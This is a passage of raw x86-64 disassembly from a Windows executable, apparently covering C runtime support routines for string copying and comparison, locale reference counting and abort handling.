   1400049b5:	48 8b 08             	mov    (%rax),%rcx
   1400049b8:	4c 89 01             	mov    %r8,(%rcx)
   1400049bb:	48 8b 06             	mov    (%rsi),%rax
   1400049be:	48 8b 08             	mov    (%rax),%rcx
   1400049c1:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1400049c5:	48 8b 06             	mov    (%rsi),%rax
   1400049c8:	48 8b 08             	mov    (%rax),%rcx
   1400049cb:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   1400049cf:	33 c0                	xor    %eax,%eax
   1400049d1:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400049d6:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400049db:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400049e0:	48 83 c4 20          	add    $0x20,%rsp
   1400049e4:	41 5f                	pop    %r15
   1400049e6:	41 5e                	pop    %r14
   1400049e8:	5f                   	pop    %rdi
   1400049e9:	c3                   	ret
   1400049ea:	cc                   	int3
   1400049eb:	cc                   	int3
   1400049ec:	48 8b d1             	mov    %rcx,%rdx
   1400049ef:	48 8d 0d ba 33 01 00 	lea    0x133ba(%rip),%rcx        # 0x140017db0
   1400049f6:	e9 65 00 00 00       	jmp    0x140004a60
   1400049fb:	cc                   	int3
   1400049fc:	4c 8b dc             	mov    %rsp,%r11
   1400049ff:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140004a03:	48 83 ec 38          	sub    $0x38,%rsp
   140004a07:	49 8d 43 08          	lea    0x8(%r11),%rax
   140004a0b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140004a0f:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140004a13:	b8 02 00 00 00       	mov    $0x2,%eax
   140004a18:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140004a1c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140004a20:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140004a24:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140004a28:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140004a2c:	e8 b7 fc ff ff       	call   0x1400046e8
   140004a31:	48 83 c4 38          	add    $0x38,%rsp
   140004a35:	c3                   	ret
   140004a36:	cc                   	int3
   140004a37:	cc                   	int3
   140004a38:	48 85 c9             	test   %rcx,%rcx
   140004a3b:	75 04                	jne    0x140004a41
   140004a3d:	83 c8 ff             	or     $0xffffffff,%eax
   140004a40:	c3                   	ret
   140004a41:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140004a45:	48 39 01             	cmp    %rax,(%rcx)
   140004a48:	75 12                	jne    0x140004a5c
   140004a4a:	48 8b 05 d7 25 01 00 	mov    0x125d7(%rip),%rax        # 0x140017028
   140004a51:	48 89 01             	mov    %rax,(%rcx)
   140004a54:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004a58:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140004a5c:	33 c0                	xor    %eax,%eax
   140004a5e:	c3                   	ret
   140004a5f:	cc                   	int3
   140004a60:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004a65:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004a6a:	55                   	push   %rbp
   140004a6b:	48 8b ec             	mov    %rsp,%rbp
   140004a6e:	48 83 ec 40          	sub    $0x40,%rsp
   140004a72:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004a76:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004a7a:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140004a7e:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140004a82:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004a86:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004a8a:	b8 02 00 00 00       	mov    $0x2,%eax
   140004a8f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004a93:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140004a97:	89 45 28             	mov    %eax,0x28(%rbp)
   140004a9a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004a9d:	e8 0a fc ff ff       	call   0x1400046ac
   140004aa2:	48 83 c4 40          	add    $0x40,%rsp
   140004aa6:	5d                   	pop    %rbp
   140004aa7:	c3                   	ret
   140004aa8:	48 8d 05 f1 2a 01 00 	lea    0x12af1(%rip),%rax        # 0x1400175a0
   140004aaf:	48 89 05 a2 39 01 00 	mov    %rax,0x139a2(%rip)        # 0x140018458
   140004ab6:	b0 01                	mov    $0x1,%al
   140004ab8:	c3                   	ret
   140004ab9:	cc                   	int3
   140004aba:	cc                   	int3
   140004abb:	cc                   	int3
   140004abc:	48 83 ec 28          	sub    $0x28,%rsp
   140004ac0:	48 8d 0d e9 32 01 00 	lea    0x132e9(%rip),%rcx        # 0x140017db0
   140004ac7:	e8 6c ff ff ff       	call   0x140004a38
   140004acc:	48 8d 0d f5 32 01 00 	lea    0x132f5(%rip),%rcx        # 0x140017dc8
   140004ad3:	e8 60 ff ff ff       	call   0x140004a38
   140004ad8:	b0 01                	mov    $0x1,%al
   140004ada:	48 83 c4 28          	add    $0x28,%rsp
   140004ade:	c3                   	ret
   140004adf:	cc                   	int3
   140004ae0:	48 83 ec 28          	sub    $0x28,%rsp
   140004ae4:	e8 db f5 ff ff       	call   0x1400040c4
   140004ae9:	b0 01                	mov    $0x1,%al
   140004aeb:	48 83 c4 28          	add    $0x28,%rsp
   140004aef:	c3                   	ret
   140004af0:	40 53                	rex push %rbx
   140004af2:	48 83 ec 20          	sub    $0x20,%rsp
   140004af6:	48 8b 1d 2b 25 01 00 	mov    0x1252b(%rip),%rbx        # 0x140017028
   140004afd:	48 8b cb             	mov    %rbx,%rcx
   140004b00:	e8 e3 0a 00 00       	call   0x1400055e8
   140004b05:	48 8b cb             	mov    %rbx,%rcx
   140004b08:	e8 2f 42 00 00       	call   0x140008d3c
   140004b0d:	48 8b cb             	mov    %rbx,%rcx
   140004b10:	e8 0b 43 00 00       	call   0x140008e20
   140004b15:	48 8b cb             	mov    %rbx,%rcx
   140004b18:	e8 9f ee ff ff       	call   0x1400039bc
   140004b1d:	48 8b cb             	mov    %rbx,%rcx
   140004b20:	e8 3f f9 ff ff       	call   0x140004464
   140004b25:	b0 01                	mov    $0x1,%al
   140004b27:	48 83 c4 20          	add    $0x20,%rsp
   140004b2b:	5b                   	pop    %rbx
   140004b2c:	c3                   	ret
   140004b2d:	cc                   	int3
   140004b2e:	cc                   	int3
   140004b2f:	cc                   	int3
   140004b30:	33 c9                	xor    %ecx,%ecx
   140004b32:	e9 f9 dd ff ff       	jmp    0x140002930
   140004b37:	cc                   	int3
   140004b38:	40 53                	rex push %rbx
   140004b3a:	48 83 ec 20          	sub    $0x20,%rsp
   140004b3e:	48 8b 0d b3 32 01 00 	mov    0x132b3(%rip),%rcx        # 0x140017df8
   140004b45:	83 c8 ff             	or     $0xffffffff,%eax
   140004b48:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004b4c:	83 f8 01             	cmp    $0x1,%eax
   140004b4f:	75 1f                	jne    0x140004b70
   140004b51:	48 8b 0d a0 32 01 00 	mov    0x132a0(%rip),%rcx        # 0x140017df8
   140004b58:	48 8d 1d 01 25 01 00 	lea    0x12501(%rip),%rbx        # 0x140017060
   140004b5f:	48 3b cb             	cmp    %rbx,%rcx
   140004b62:	74 0c                	je     0x140004b70
   140004b64:	e8 ef 0c 00 00       	call   0x140005858
   140004b69:	48 89 1d 88 32 01 00 	mov    %rbx,0x13288(%rip)        # 0x140017df8
   140004b70:	b0 01                	mov    $0x1,%al
   140004b72:	48 83 c4 20          	add    $0x20,%rsp
   140004b76:	5b                   	pop    %rbx
   140004b77:	c3                   	ret
   140004b78:	48 83 ec 28          	sub    $0x28,%rsp
   140004b7c:	48 8b 0d d5 3a 01 00 	mov    0x13ad5(%rip),%rcx        # 0x140018658
   140004b83:	e8 d0 0c 00 00       	call   0x140005858
   140004b88:	48 8b 0d d1 3a 01 00 	mov    0x13ad1(%rip),%rcx        # 0x140018660
   140004b8f:	48 83 25 c1 3a 01 00 	andq   $0x0,0x13ac1(%rip)        # 0x140018658
   140004b96:	00 
   140004b97:	e8 bc 0c 00 00       	call   0x140005858
   140004b9c:	48 8b 0d dd 31 01 00 	mov    0x131dd(%rip),%rcx        # 0x140017d80
   140004ba3:	48 83 25 b5 3a 01 00 	andq   $0x0,0x13ab5(%rip)        # 0x140018660
   140004baa:	00 
   140004bab:	e8 a8 0c 00 00       	call   0x140005858
   140004bb0:	48 8b 0d d1 31 01 00 	mov    0x131d1(%rip),%rcx        # 0x140017d88
   140004bb7:	48 83 25 c1 31 01 00 	andq   $0x0,0x131c1(%rip)        # 0x140017d80
   140004bbe:	00 
   140004bbf:	e8 94 0c 00 00       	call   0x140005858
   140004bc4:	48 83 25 bc 31 01 00 	andq   $0x0,0x131bc(%rip)        # 0x140017d88
   140004bcb:	00 
   140004bcc:	b0 01                	mov    $0x1,%al
   140004bce:	48 83 c4 28          	add    $0x28,%rsp
   140004bd2:	c3                   	ret
   140004bd3:	cc                   	int3
   140004bd4:	48 8d 15 25 a8 00 00 	lea    0xa825(%rip),%rdx        # 0x14000f400
   140004bdb:	48 8d 0d 1e a7 00 00 	lea    0xa71e(%rip),%rcx        # 0x14000f300
   140004be2:	e9 99 40 00 00       	jmp    0x140008c80
   140004be7:	cc                   	int3
   140004be8:	48 83 ec 28          	sub    $0x28,%rsp
   140004bec:	84 c9                	test   %cl,%cl
   140004bee:	74 16                	je     0x140004c06
   140004bf0:	48 83 3d 58 3a 01 00 	cmpq   $0x0,0x13a58(%rip)        # 0x140018650
   140004bf7:	00 
   140004bf8:	74 05                	je     0x140004bff
   140004bfa:	e8 51 47 00 00       	call   0x140009350
   140004bff:	b0 01                	mov    $0x1,%al
   140004c01:	48 83 c4 28          	add    $0x28,%rsp
   140004c05:	c3                   	ret
   140004c06:	48 8d 15 f3 a7 00 00 	lea    0xa7f3(%rip),%rdx        # 0x14000f400
   140004c0d:	48 8d 0d ec a6 00 00 	lea    0xa6ec(%rip),%rcx        # 0x14000f300
   140004c14:	48 83 c4 28          	add    $0x28,%rsp
   140004c18:	e9 e3 40 00 00       	jmp    0x140008d00
   140004c1d:	cc                   	int3
   140004c1e:	cc                   	int3
   140004c1f:	cc                   	int3
   140004c20:	48 83 ec 28          	sub    $0x28,%rsp
   140004c24:	e8 bb 05 00 00       	call   0x1400051e4
   140004c29:	48 8b 40 18          	mov    0x18(%rax),%rax
   140004c2d:	48 85 c0             	test   %rax,%rax
   140004c30:	74 08                	je     0x140004c3a
   140004c32:	ff 15 00 96 00 00    	call   *0x9600(%rip)        # 0x14000e238
   140004c38:	eb 00                	jmp    0x140004c3a
   140004c3a:	e8 01 00 00 00       	call   0x140004c40
   140004c3f:	90                   	nop
   140004c40:	48 83 ec 28          	sub    $0x28,%rsp
   140004c44:	e8 a7 41 00 00       	call   0x140008df0
   140004c49:	48 85 c0             	test   %rax,%rax
   140004c4c:	74 0a                	je     0x140004c58
   140004c4e:	b9 16 00 00 00       	mov    $0x16,%ecx
   140004c53:	e8 e8 41 00 00       	call   0x140008e40
   140004c58:	f6 05 e1 23 01 00 02 	testb  $0x2,0x123e1(%rip)        # 0x140017040
   140004c5f:	74 2a                	je     0x140004c8b
   140004c61:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004c66:	ff 15 0c 94 00 00    	call   *0x940c(%rip)        # 0x14000e078
   140004c6c:	85 c0                	test   %eax,%eax
   140004c6e:	74 07                	je     0x140004c77
   140004c70:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004c75:	cd 29                	int    $0x29
   140004c77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004c7d:	ba 15 00 00 40       	mov    $0x40000015,%edx
   140004c82:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140004c86:	e8 01 08 00 00       	call   0x14000548c
   140004c8b:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004c90:	e8 f7 f7 ff ff       	call   0x14000448c
   140004c95:	cc                   	int3
   140004c96:	cc                   	int3
   140004c97:	cc                   	int3
   140004c98:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   140004c9f:	00 
   140004ca0:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140004ca4:	e9 af 0b 00 00       	jmp    0x140005858
   140004ca9:	cc                   	int3
   140004caa:	cc                   	int3
   140004cab:	cc                   	int3
   140004cac:	40 53                	rex push %rbx
   140004cae:	48 83 ec 20          	sub    $0x20,%rsp
   140004cb2:	33 db                	xor    %ebx,%ebx
   140004cb4:	48 85 c9             	test   %rcx,%rcx
   140004cb7:	74 0c                	je     0x140004cc5
   140004cb9:	48 85 d2             	test   %rdx,%rdx
   140004cbc:	74 07                	je     0x140004cc5
   140004cbe:	4d 85 c0             	test   %r8,%r8
   140004cc1:	75 1b                	jne    0x140004cde
   140004cc3:	88 19                	mov    %bl,(%rcx)
   140004cc5:	e8 f6 0a 00 00       	call   0x1400057c0
   140004cca:	bb 16 00 00 00       	mov    $0x16,%ebx
   140004ccf:	89 18                	mov    %ebx,(%rax)
   140004cd1:	e8 ca 09 00 00       	call   0x1400056a0
   140004cd6:	8b c3                	mov    %ebx,%eax
   140004cd8:	48 83 c4 20          	add    $0x20,%rsp
   140004cdc:	5b                   	pop    %rbx
   140004cdd:	c3                   	ret
   140004cde:	4c 8b c9             	mov    %rcx,%r9
   140004ce1:	4c 2b c1             	sub    %rcx,%r8
   140004ce4:	43 8a 04 08          	mov    (%r8,%r9,1),%al
   140004ce8:	41 88 01             	mov    %al,(%r9)
   140004ceb:	49 ff c1             	inc    %r9
   140004cee:	84 c0                	test   %al,%al
   140004cf0:	74 06                	je     0x140004cf8
   140004cf2:	48 83 ea 01          	sub    $0x1,%rdx
   140004cf6:	75 ec                	jne    0x140004ce4
   140004cf8:	48 85 d2             	test   %rdx,%rdx
   140004cfb:	75 d9                	jne    0x140004cd6
   140004cfd:	88 19                	mov    %bl,(%rcx)
   140004cff:	e8 bc 0a 00 00       	call   0x1400057c0
   140004d04:	bb 22 00 00 00       	mov    $0x22,%ebx
   140004d09:	eb c4                	jmp    0x140004ccf
   140004d0b:	cc                   	int3
   140004d0c:	e9 cf 0a 00 00       	jmp    0x1400057e0
   140004d11:	cc                   	int3
   140004d12:	cc                   	int3
   140004d13:	cc                   	int3
   140004d14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d19:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004d1e:	57                   	push   %rdi
   140004d1f:	48 83 ec 20          	sub    $0x20,%rsp
   140004d23:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140004d27:	48 8b f9             	mov    %rcx,%rdi
   140004d2a:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   140004d2e:	48 85 d2             	test   %rdx,%rdx
   140004d31:	74 05                	je     0x140004d38
   140004d33:	0f 10 02             	movups (%rdx),%xmm0
   140004d36:	eb 10                	jmp    0x140004d48
   140004d38:	83 3d 61 30 01 00 00 	cmpl   $0x0,0x13061(%rip)        # 0x140017da0
   140004d3f:	75 0d                	jne    0x140004d4e
   140004d41:	0f 10 05 b0 29 01 00 	movups 0x129b0(%rip),%xmm0        # 0x1400176f8
   140004d48:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140004d4c:	eb 4e                	jmp    0x140004d9c
   140004d4e:	e8 91 04 00 00       	call   0x1400051e4
   140004d53:	48 89 07             	mov    %rax,(%rdi)
   140004d56:	48 8b d6             	mov    %rsi,%rdx
   140004d59:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140004d60:	48 89 0e             	mov    %rcx,(%rsi)
   140004d63:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140004d6a:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   140004d6e:	48 8b c8             	mov    %rax,%rcx
   140004d71:	e8 fe 48 00 00       	call   0x140009674
   140004d76:	48 8b 0f             	mov    (%rdi),%rcx
   140004d79:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140004d7d:	e8 26 49 00 00       	call   0x1400096a8
   140004d82:	48 8b 0f             	mov    (%rdi),%rcx
   140004d85:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140004d8b:	a8 02                	test   $0x2,%al
   140004d8d:	75 0d                	jne    0x140004d9c
   140004d8f:	83 c8 02             	or     $0x2,%eax
   140004d92:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140004d98:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140004d9c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004da1:	48 8b c7             	mov    %rdi,%rax
   140004da4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004da9:	48 83 c4 20          	add    $0x20,%rsp
   140004dad:	5f                   	pop    %rdi
   140004dae:	c3                   	ret
   140004daf:	cc                   	int3
   140004db0:	cc                   	int3
   140004db1:	cc                   	int3
   140004db2:	cc                   	int3
   140004db3:	cc                   	int3
   140004db4:	cc                   	int3
   140004db5:	cc                   	int3
   140004db6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004dbd:	00 00 00 
   140004dc0:	48 2b d1             	sub    %rcx,%rdx
   140004dc3:	4d 85 c0             	test   %r8,%r8
   140004dc6:	74 6a                	je     0x140004e32
   140004dc8:	f7 c1 07 00 00 00    	test   $0x7,%ecx
   140004dce:	74 1d                	je     0x140004ded
   140004dd0:	0f b6 01             	movzbl (%rcx),%eax
   140004dd3:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140004dd6:	75 5d                	jne    0x140004e35
   140004dd8:	48 ff c1             	inc    %rcx
   140004ddb:	49 ff c8             	dec    %r8
   140004dde:	74 52                	je     0x140004e32
   140004de0:	84 c0                	test   %al,%al
   140004de2:	74 4e                	je     0x140004e32
   140004de4:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   140004deb:	75 e3                	jne    0x140004dd0
   140004ded:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   140004df4:	80 80 80 
   140004df7:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   140004dfe:	fe fe fe 
   140004e01:	8d 04 0a             	lea    (%rdx,%rcx,1),%eax
   140004e04:	25 ff 0f 00 00       	and    $0xfff,%eax
   140004e09:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   140004e0e:	77 c0                	ja     0x140004dd0
   140004e10:	48 8b 01             	mov    (%rcx),%rax
   140004e13:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140004e17:	75 b7                	jne    0x140004dd0
   140004e19:	48 83 c1 08          	add    $0x8,%rcx
   140004e1d:	49 83 e8 08          	sub    $0x8,%r8
   140004e21:	76 0f                	jbe    0x140004e32
   140004e23:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   140004e27:	48 f7 d0             	not    %rax
   140004e2a:	49 23 c1             	and    %r9,%rax
   140004e2d:	49 85 c3             	test   %rax,%r11
   140004e30:	74 cf                	je     0x140004e01
   140004e32:	33 c0                	xor    %eax,%eax
   140004e34:	c3                   	ret
   140004e35:	48 1b c0             	sbb    %rax,%rax
   140004e38:	48 83 c8 01          	or     $0x1,%rax
   140004e3c:	c3                   	ret
   140004e3d:	cc                   	int3
   140004e3e:	cc                   	int3
   140004e3f:	cc                   	int3
   140004e40:	4d 85 c0             	test   %r8,%r8
   140004e43:	75 18                	jne    0x140004e5d
   140004e45:	33 c0                	xor    %eax,%eax
   140004e47:	c3                   	ret
   140004e48:	0f b7 01             	movzwl (%rcx),%eax
   140004e4b:	66 85 c0             	test   %ax,%ax
   140004e4e:	74 13                	je     0x140004e63
   140004e50:	66 3b 02             	cmp    (%rdx),%ax
   140004e53:	75 0e                	jne    0x140004e63
   140004e55:	48 83 c1 02          	add    $0x2,%rcx
   140004e59:	48 83 c2 02          	add    $0x2,%rdx
   140004e5d:	49 83 e8 01          	sub    $0x1,%r8
   140004e61:	75 e5                	jne    0x140004e48
   140004e63:	0f b7 01             	movzwl (%rcx),%eax
   140004e66:	0f b7 0a             	movzwl (%rdx),%ecx
   140004e69:	2b c1                	sub    %ecx,%eax
   140004e6b:	c3                   	ret
   140004e6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004e71:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004e76:	57                   	push   %rdi
   140004e77:	48 83 ec 20          	sub    $0x20,%rsp
   140004e7b:	49 8b d9             	mov    %r9,%rbx
   140004e7e:	49 8b f8             	mov    %r8,%rdi
   140004e81:	8b 0a                	mov    (%rdx),%ecx
   140004e83:	e8 5c 27 00 00       	call   0x1400075e4
   140004e88:	90                   	nop
   140004e89:	48 8b 07             	mov    (%rdi),%rax
   140004e8c:	48 8b 08             	mov    (%rax),%rcx
   140004e8f:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140004e96:	f0 ff 00             	lock incl (%rax)
   140004e99:	8b 0b                	mov    (%rbx),%ecx
   140004e9b:	e8 98 27 00 00       	call   0x140007638
   140004ea0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ea5:	48 83 c4 20          	add    $0x20,%rsp
   140004ea9:	5f                   	pop    %rdi
   140004eaa:	c3                   	ret
   140004eab:	cc                   	int3
   140004eac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004eb1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004eb6:	57                   	push   %rdi
   140004eb7:	48 83 ec 20          	sub    $0x20,%rsp
   140004ebb:	49 8b d9             	mov    %r9,%rbx
   140004ebe:	49 8b f8             	mov    %r8,%rdi
   140004ec1:	8b 0a                	mov    (%rdx),%ecx
   140004ec3:	e8 1c 27 00 00       	call   0x1400075e4
   140004ec8:	90                   	nop
   140004ec9:	48 8b 0f             	mov    (%rdi),%rcx
   140004ecc:	33 d2                	xor    %edx,%edx
   140004ece:	48 8b 09             	mov    (%rcx),%rcx
   140004ed1:	e8 a6 02 00 00       	call   0x14000517c
   140004ed6:	90                   	nop
   140004ed7:	8b 0b                	mov    (%rbx),%ecx
   140004ed9:	e8 5a 27 00 00       	call   0x140007638
   140004ede:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ee3:	48 83 c4 20          	add    $0x20,%rsp
   140004ee7:	5f                   	pop    %rdi
   140004ee8:	c3                   	ret
   140004ee9:	cc                   	int3
   140004eea:	cc                   	int3
   140004eeb:	cc                   	int3
   140004eec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ef1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004ef6:	57                   	push   %rdi
   140004ef7:	48 83 ec 20          	sub    $0x20,%rsp
   140004efb:	49 8b d9             	mov    %r9,%rbx
   140004efe:	49 8b f8             	mov    %r8,%rdi
   140004f01:	8b 0a                	mov    (%rdx),%ecx
   140004f03:	e8 dc 26 00 00       	call   0x1400075e4
   140004f08:	90                   	nop
   140004f09:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004f0d:	48 8b 10             	mov    (%rax),%rdx
   140004f10:	48 8b 0f             	mov    (%rdi),%rcx
   140004f13:	48 8b 12             	mov    (%rdx),%rdx
   140004f16:	48 8b 09             	mov    (%rcx),%rcx
   140004f19:	e8 5e 02 00 00       	call   0x14000517c
   140004f1e:	90                   	nop
   140004f1f:	8b 0b                	mov    (%rbx),%ecx
   140004f21:	e8 12 27 00 00       	call   0x140007638
   140004f26:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f2b:	48 83 c4 20          	add    $0x20,%rsp
   140004f2f:	5f                   	pop    %rdi
   140004f30:	c3                   	ret
   140004f31:	cc                   	int3
   140004f32:	cc                   	int3
   140004f33:	cc                   	int3
   140004f34:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f39:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004f3e:	57                   	push   %rdi
   140004f3f:	48 83 ec 20          	sub    $0x20,%rsp
   140004f43:	49 8b d9             	mov    %r9,%rbx
   140004f46:	49 8b f8             	mov    %r8,%rdi
   140004f49:	8b 0a                	mov    (%rdx),%ecx
   140004f4b:	e8 94 26 00 00       	call   0x1400075e4
   140004f50:	90                   	nop
   140004f51:	48 8b 07             	mov    (%rdi),%rax
   140004f54:	48 8b 08             	mov    (%rax),%rcx
   140004f57:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140004f5e:	48 85 c9             	test   %rcx,%rcx
   140004f61:	74 1e                	je     0x140004f81
   140004f63:	83 c8 ff             	or     $0xffffffff,%eax
   140004f66:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004f6a:	83 f8 01             	cmp    $0x1,%eax
   140004f6d:	75 12                	jne    0x140004f81
   140004f6f:	48 8d 05 ea 20 01 00 	lea    0x120ea(%rip),%rax        # 0x140017060
   140004f76:	48 3b c8             	cmp    %rax,%rcx
   140004f79:	74 06                	je     0x140004f81
   140004f7b:	e8 d8 08 00 00       	call   0x140005858
   140004f80:	90                   	nop
   140004f81:	8b 0b                	mov    (%rbx),%ecx
   140004f83:	e8 b0 26 00 00       	call   0x140007638
   140004f88:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f8d:	48 83 c4 20          	add    $0x20,%rsp
   140004f91:	5f                   	pop    %rdi
   140004f92:	c3                   	ret
   140004f93:	cc                   	int3
   140004f94:	40 55                	rex push %rbp
   140004f96:	48 8b ec             	mov    %rsp,%rbp
   140004f99:	48 83 ec 50          	sub    $0x50,%rsp
   140004f9d:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   140004fa1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140004fa5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004fa9:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140004fad:	ba 01 00 00 00       	mov    $0x1,%edx
   140004fb2:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004fb6:	b8 05 00 00 00       	mov    $0x5,%eax
   140004fbb:	89 45 20             	mov    %eax,0x20(%rbp)
   140004fbe:	89 45 28             	mov    %eax,0x28(%rbp)
   140004fc1:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140004fc5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004fc9:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004fcd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004fd1:	b8 04 00 00 00       	mov    $0x4,%eax
   140004fd6:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140004fd9:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140004fdc:	48 8d 05 75 34 01 00 	lea    0x13475(%rip),%rax        # 0x140018458
   140004fe3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004fe7:	89 51 28             	mov    %edx,0x28(%rcx)
   140004fea:	48 8d 0d 0f a2 00 00 	lea    0xa20f(%rip),%rcx        # 0x14000f200
   140004ff1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004ff5:	48 89 08             	mov    %rcx,(%rax)
   140004ff8:	48 8d 0d 61 20 01 00 	lea    0x12061(%rip),%rcx        # 0x140017060
   140004fff:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005003:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   140005009:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000500d:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   140005014:	8d 4a 42             	lea    0x42(%rdx),%ecx
   140005017:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000501b:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   14000501f:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140005026:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000502a:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   140005031:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005035:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140005039:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   140005040:	00 
   140005041:	e8 26 fe ff ff       	call   0x140004e6c
   140005046:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   14000504a:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000504e:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   140005052:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005056:	e8 91 fe ff ff       	call   0x140004eec
   14000505b:	48 83 c4 50          	add    $0x50,%rsp
   14000505f:	5d                   	pop    %rbp
   140005060:	c3                   	ret
   140005061:	cc                   	int3
   140005062:	cc                   	int3
   140005063:	cc                   	int3
   140005064:	48 85 c9             	test   %rcx,%rcx
   140005067:	74 1a                	je     0x140005083
   140005069:	53                   	push   %rbx
   14000506a:	48 83 ec 20          	sub    $0x20,%rsp
   14000506e:	48 8b d9             	mov    %rcx,%rbx
   140005071:	e8 0e 00 00 00       	call   0x140005084
   140005076:	48 8b cb             	mov    %rbx,%rcx
   140005079:	e8 da 07 00 00       	call   0x140005858
   14000507e:	48 83 c4 20          	add    $0x20,%rsp
   140005082:	5b                   	pop    %rbx
   140005083:	c3                   	ret
   140005084:	40 55                	rex push %rbp
   140005086:	48 8b ec             	mov    %rsp,%rbp
   140005089:	48 83 ec 40          	sub    $0x40,%rsp
   14000508d:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   140005091:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
